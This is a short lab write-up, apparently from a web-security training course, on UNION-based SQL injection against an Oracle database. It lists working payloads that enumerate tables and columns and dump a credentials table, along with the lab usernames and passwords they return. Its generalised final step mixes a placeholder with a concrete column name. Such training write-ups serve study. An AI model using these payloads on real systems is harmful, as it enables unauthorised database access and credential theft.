# Lab: SQL injection attack, listing the database contents on Oracle
## Description

1) Tried the classic attempts `' UNION SELECT NULL,...--` but wasted a bit of time. Its Oracle, so `FROM dual` is required.

2) Find all tables `'+UNION+SELECT+TABLE_NAME,NULL+FROM+all_tables--`

3) To remove the noise I copied all table names to a file (tables.lst) and filtered by names that didn't contain `$` using `grep -vi '\$' tables.lst` which returned too much. I tried `grep -vi '\$' tabels.lst |grep -i user` which returned a smaller list of interesting tabels:
```
APP_USERS_AND_ROLES
SDO_PREFERRED_OPS_USER
SYS_FBA_USERS
USERS_ITIVJR
USER_ASTATUS_MAP
WWV_FLOW_EFFECTIVE_USERID_MAP
WWV_FLOW_FND_GROUP_USERS
WWV_FLOW_FND_USER
WWV_FLOW_FND_USER_GROUPS
WWV_FLOW_PICK_END_USERS
WWV_MIG_ACC_USERS
```

4) I started to review the columns in tables using `' UNION SELECT COLUMN_NAME,NULL FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'APP_USERS_AND_ROLES'--` until I eventually found `USERS_ITIVJR`

5) Get column names in table `'+UNION+SELECT+COLUMN_NAME,NULL+FROM+ALL_TAB_COLUMNS+WHERE+TABLE_NAME+%3d+'USERS_ITIVJR'--`
```
USERNAME_FIEWOR
PASSWORD_MCHWNF
```

6) Get data from columns: `' UNION SELECT USERNAME_FIEWOR,PASSWORD_MCHWNF FROM USERS_ITIVJR--`
```
administrator
fzz6dif830taflco34cz
carlos
9uquotyga76zjwzet28c
wiener
t67889reaexj1ww9n9bp
```


## Solution

1) Find table name with credentials: `'+UNION+SELECT+TABLE_NAME,NULL+FROM+all_tables+WHERE+TABLE_NAME+LIKE+'USERS_%'--`
2) Find column names: `'+UNION+SELECT+COLUMN_NAME,NULL+FROM+ALL_TAB_COLUMNS+WHERE+TABLE_NAME+%3d+'USERS_XXXXXXXX'--`
3) Find admin credentials `'+UNION+SELECT+USERNAME_YYYYYYYY,PASSWORD_MCHWNF+FROM+USERS_XXXXXXXX--`
